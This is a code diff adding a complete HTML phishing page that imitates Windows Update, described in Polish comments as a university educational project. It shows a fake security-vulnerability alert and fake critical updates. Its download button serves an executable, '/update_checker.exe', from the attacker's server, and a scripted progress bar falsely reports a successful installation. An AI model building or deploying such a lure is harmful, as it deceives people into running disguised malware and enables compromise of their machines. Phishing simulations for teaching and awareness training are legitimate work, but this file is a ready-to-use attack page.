@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows Update</title>
+  <style>
+    /* ============================================================
+       Phishing page — imitacja Windows Update
+       Projekt akademicki / cel edukacyjny
+       Autorzy: Oliwia Giza (strona phishingowa)
+       Uczelnia: Uniwersytet Vizja, 2025/2026
+       ============================================================ */
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Segoe UI", "Segoe UI Web", Arial, sans-serif;
+      background: #f3f3f3;
+      color: #1a1a1a;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* --- Pasek tytułowy Windows --- */
+    .titlebar {
+      background: #0067b8;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      gap: 8px;
+    }
+
+    .titlebar-title {
+      color: #fff;
+      font-size: 12px;
+      flex: 1;
+    }
+
+    .titlebar-controls {
+      display: flex;
+      gap: 0;
+    }
+
+    .titlebar-btn {
+      width: 46px;
+      height: 32px;
+      border: none;
+      background: transparent;
+      color: #fff;
+      font-size: 14px;
+      cursor: default;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .titlebar-btn:hover { background: rgba(255,255,255,0.1); }
+    .titlebar-btn.close:hover { background: #e81123; }
+
+    /* --- Główny layout --- */
+    .window {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      max-width: 900px;
+      margin: 0 auto;
+      width: 100%;
+      box-shadow: 0 0 0 1px #d0d0d0;
+    }
+
+    /* --- Nagłówek panelu --- */
+    .panel-header {
+      background: #0067b8;
+      color: #fff;
+      padding: 20px 32px 16px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .panel-header svg {
+      flex-shrink: 0;
+    }
+
+    .panel-header h1 {
+      font-size: 20px;
+      font-weight: 400;
+      letter-spacing: 0.01em;
+    }
+
+    .panel-header p {
+      font-size: 13px;
+      opacity: 0.85;
+      margin-top: 2px;
+    }
+
+    /* --- Sidebar + treść --- */
+    .panel-body {
+      display: flex;
+      flex: 1;
+    }
+
+    .sidebar {
+      width: 200px;
+      background: #f5f5f5;
+      border-right: 1px solid #e0e0e0;
+      padding: 16px 0;
+      flex-shrink: 0;
+    }
+
+    .sidebar-item {
+      padding: 8px 20px;
+      font-size: 13px;
+      color: #444;
+      cursor: default;
+      border-left: 3px solid transparent;
+    }
+
+    .sidebar-item.active {
+      background: #e5f0fb;
+      border-left-color: #0067b8;
+      color: #0067b8;
+      font-weight: 600;
+    }
+
+    .sidebar-item:hover:not(.active) {
+      background: #ebebeb;
+    }
+
+    /* --- Główna treść --- */
+    .content {
+      flex: 1;
+      padding: 24px 32px;
+      overflow-y: auto;
+    }
+
+    /* --- Sekcja alertu --- */
+    .alert-box {
+      background: #fff4ce;
+      border: 1px solid #f0c000;
+      border-left: 4px solid #f0c000;
+      padding: 12px 16px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 24px;
+      border-radius: 2px;
+    }
+
+    .alert-icon {
+      font-size: 20px;
+      line-height: 1;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .alert-text h3 {
+      font-size: 13px;
+      font-weight: 600;
+      color: #7a4f00;
+      margin-bottom: 4px;
+    }
+
+    .alert-text p {
+      font-size: 12px;
+      color: #7a4f00;
+      line-height: 1.5;
+    }
+
+    /* --- Sekcja aktualizacji --- */
+    .update-section h2 {
+      font-size: 15px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      color: #1a1a1a;
+    }
+
+    /* --- Karta aktualizacji --- */
+    .update-card {
+      border: 1px solid #e0e0e0;
+      border-radius: 2px;
+      margin-bottom: 12px;
+      overflow: hidden;
+    }
+
+    .update-card-header {
+      padding: 12px 16px;
+      background: #f9f9f9;
+      border-bottom: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .update-severity {
+      font-size: 11px;
+      font-weight: 600;
+      padding: 2px 8px;
+      border-radius: 2px;
+      text-transform: uppercase;
+    }
+
+    .severity-critical {
+      background: #e81123;
+      color: #fff;
+    }
+
+    .severity-important {
+      background: #f0c000;
+      color: #1a1a1a;
+    }
+
+    .update-name {
+      font-size: 13px;
+      font-weight: 600;
+      flex: 1;
+    }
+
+    .update-size {
+      font-size: 12px;
+      color: #666;
+    }
+
+    .update-card-body {
+      padding: 12px 16px;
+    }
+
+    .update-card-body p {
+      font-size: 12px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 8px;
+    }
+
+    .update-meta {
+      display: flex;
+      gap: 24px;
+      font-size: 11px;
+      color: #888;
+    }
+
+    /* --- Progress bar --- */
+    .progress-section {
+      margin: 24px 0;
+      display: none; /* pokazuje się po kliknięciu przycisku */
+    }
+
+    .progress-section.visible {
+      display: block;
+    }
+
+    .progress-label {
+      font-size: 12px;
+      color: #444;
+      margin-bottom: 6px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .progress-bar-track {
+      height: 6px;
+      background: #e0e0e0;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: #0067b8;
+      border-radius: 3px;
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    .progress-status {
+      font-size: 12px;
+      color: #0067b8;
+      margin-top: 6px;
+    }
+
+    /* --- Przycisk pobierania --- */
+    .btn-download {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #0067b8;
+      color: #fff;
+      border: none;
+      padding: 8px 20px;
+      font-size: 13px;
+      font-family: inherit;
+      cursor: pointer;
+      border-radius: 2px;
+      margin-top: 8px;
+      text-decoration: none;
+    }
+
+    .btn-download:hover {
+      background: #005a9e;
+    }
+
+    .btn-download:active {
+      background: #004e8c;
+    }
+
+    .btn-download:disabled {
+      background: #a0a0a0;
+      cursor: default;
+    }
+
+    /* --- Stopka --- */
+    .panel-footer {
+      border-top: 1px solid #e0e0e0;
+      padding: 10px 32px;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .panel-footer p {
+      font-size: 11px;
+      color: #888;
+    }
+
+    .panel-footer a {
+      font-size: 11px;
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .panel-footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Pasek tytułowy -->
+  <div class="titlebar">
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+      <rect x="0" y="0" width="7" height="7" fill="#f25022"/>
+      <rect x="9" y="0" width="7" height="7" fill="#7fba00"/>
+      <rect x="0" y="9" width="7" height="7" fill="#00a4ef"/>
+      <rect x="9" y="9" width="7" height="7" fill="#ffb900"/>
+    </svg>
+    <span class="titlebar-title">Windows Update</span>
+    <div class="titlebar-controls">
+      <button class="titlebar-btn">&#8211;</button>
+      <button class="titlebar-btn">&#9633;</button>
+      <button class="titlebar-btn close">&#10005;</button>
+    </div>
+  </div>
+
+  <!-- Główne okno -->
+  <div class="window">
+
+    <!-- Nagłówek -->
+    <div class="panel-header">
+      <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+        <rect x="0" y="0" width="14" height="14" fill="#f25022"/>
+        <rect x="18" y="0" width="14" height="14" fill="#7fba00"/>
+        <rect x="0" y="18" width="14" height="14" fill="#00a4ef"/>
+        <rect x="18" y="18" width="14" height="14" fill="#ffb900"/>
+      </svg>
+      <div>
+        <h1>Windows Update</h1>
+        <p>Keep your device up to date and protected</p>
+      </div>
+    </div>
+
+    <div class="panel-body">
+
+      <!-- Sidebar -->
+      <div class="sidebar">
+        <div class="sidebar-item active">Windows Update</div>
+        <div class="sidebar-item">Update history</div>
+        <div class="sidebar-item">Advanced options</div>
+        <div class="sidebar-item">Optional updates</div>
+        <div class="sidebar-item">Windows Insider Program</div>
+      </div>
+
+      <!-- Treść -->
+      <div class="content">
+
+        <!-- Alert o zagrożeniu -->
+        <div class="alert-box">
+          <div class="alert-icon">&#9888;</div>
+          <div class="alert-text">
+            <h3>Security vulnerability detected</h3>
+            <p>
+              Windows Defender has identified a critical security vulnerability on this device.
+              A mandatory security patch (KB5034441) must be installed immediately to prevent
+              unauthorized access and potential data loss.
+            </p>
+          </div>
+        </div>
+
+        <!-- Sekcja aktualizacji -->
+        <div class="update-section">
+          <h2>Critical updates available</h2>
+
+          <!-- Aktualizacja 1 — krytyczna -->
+          <div class="update-card">
+            <div class="update-card-header">
+              <span class="update-severity severity-critical">Critical</span>
+              <span class="update-name">2024-12 Cumulative Security Update for Windows 10 (KB5034441)</span>
+              <span class="update-size">847 MB</span>
+            </div>
+            <div class="update-card-body">
+              <p>
+                This security update resolves a critical remote code execution vulnerability in
+                Windows Kernel (CVE-2024-38193) and addresses privilege escalation issues in
+                Windows Common Log File System Driver. Installation is required to maintain
+                device security and compliance.
+              </p>
+              <div class="update-meta">
+                <span>Released: 2024-12-10</span>
+                <span>Classification: Security Update</span>
+                <span>Restart required: Yes</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Aktualizacja 2 — ważna -->
+          <div class="update-card">
+            <div class="update-card-header">
+              <span class="update-severity severity-important">Important</span>
+              <span class="update-name">Windows Defender Antivirus Platform Update (KB5007651)</span>
+              <span class="update-size">124 MB</span>
+            </div>
+            <div class="update-card-body">
+              <p>
+                Updates Windows Defender platform to version 4.18.24110.6, improving detection
+                accuracy for emerging threats and updating signature definitions.
+              </p>
+              <div class="update-meta">
+                <span>Released: 2024-12-08</span>
+                <span>Classification: Definition Update</span>
+                <span>Restart required: No</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Progress bar (ukryty, pokazuje się po kliknięciu) -->
+        <div class="progress-section" id="progressSection">
+          <div class="progress-label">
+            <span id="progressText">Preparing download...</span>
+            <span id="progressPercent">0%</span>
+          </div>
+          <div class="progress-bar-track">
+            <div class="progress-bar-fill" id="progressFill"></div>
+          </div>
+          <div class="progress-status" id="progressStatus">Connecting to Windows Update servers...</div>
+        </div>
+
+        <!-- Przycisk pobierania -->
+        <!-- [PLACEHOLDER] href — podmienić na rzeczywistą nazwę pliku .exe serwowanego przez Apache -->
+        <a class="btn-download" id="downloadBtn" href="/update_checker.exe" download>
+          &#8595;&nbsp; Download and install
+        </a>
+
+      </div>
+    </div>
+
+    <!-- Stopka -->
+    <div class="panel-footer">
+      <p>Last checked: Today, <span id="lastChecked"></span></p>
+      <a href="#">Privacy statement</a>
+    </div>
+
+  </div>
+
+  <script>
+    // ============================================================
+    //  Skrypt strony phishingowej
+    //  Cel: animacja progress bar po kliknieciu przycisku pobierania
+    //  Projekt akademicki — cel edukacyjny
+    // ============================================================
+
+    // Wyświetl aktualny czas w stopce ("Last checked")
+    const now = new Date();
+    document.getElementById('lastChecked').textContent =
+      now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+
+    // Etapy progress bara — tekst statusu i docelowy % na końcu etapu
+    const stages = [
+      { text: 'Connecting to Windows Update servers...', target: 12 },
+      { text: 'Downloading KB5034441 (0 of 847 MB)...',  target: 28 },
+      { text: 'Downloading KB5034441 (213 of 847 MB)...', target: 47 },
+      { text: 'Downloading KB5034441 (501 of 847 MB)...', target: 63 },
+      { text: 'Downloading KB5034441 (779 of 847 MB)...', target: 81 },
+      { text: 'Download complete. Verifying integrity...',  target: 90 },
+      { text: 'Installing update, please wait...',          target: 97 },
+      { text: 'Finalizing installation...',                 target: 100 },
+    ];
+
+    let currentPercent = 0;
+    let stageIndex = 0;
+    let animInterval = null;
+
+    // Elementy DOM
+    const progressSection = document.getElementById('progressSection');
+    const progressFill    = document.getElementById('progressFill');
+    const progressPercent = document.getElementById('progressPercent');
+    const progressText    = document.getElementById('progressText');
+    const progressStatus  = document.getElementById('progressStatus');
+    const downloadBtn     = document.getElementById('downloadBtn');
+
+    // Funkcja animująca — wywołuje się co 80ms
+    function animateProgress() {
+      if (stageIndex >= stages.length) {
+        // Progress doszedł do 100% — zakończ animację
+        clearInterval(animInterval);
+        progressStatus.textContent = 'Installation complete. Changes will take effect after restart.';
+        progressStatus.style.color = '#107c10'; // zielony
+        return;
+      }
+
+      const stage = stages[stageIndex];
+
+      if (currentPercent < stage.target) {
+        // Zwiększ % o 1 punkt
+        currentPercent++;
+        progressFill.style.width    = currentPercent + '%';
+        progressPercent.textContent = currentPercent + '%';
+        progressText.textContent    = stage.text;
+        progressStatus.textContent  = stage.text;
+      } else {
+        // Osiągnięto cel etapu — przejdź do następnego
+        stageIndex++;
+      }
+    }
+
+    // Obsługa kliknięcia przycisku pobierania
+    downloadBtn.addEventListener('click', function(e) {
+      // Pokaż sekcję progress bara
+      progressSection.classList.add('visible');
+
+      // Wyłącz przycisk żeby nie klikać wielokrotnie
+      downloadBtn.style.pointerEvents = 'none';
+      downloadBtn.style.background = '#a0a0a0';
+
+      // Uruchom animację progress bara
+      // Interwał 80ms → ~8 sekund do 100% (płynna animacja)
+      animInterval = setInterval(animateProgress, 80);
+
+      // Przeglądarka i tak pobierze plik przez href/download
+      // — nie przerywamy domyślnego zachowania linku
+    });
+  </script>
+
+</body>
+</html>
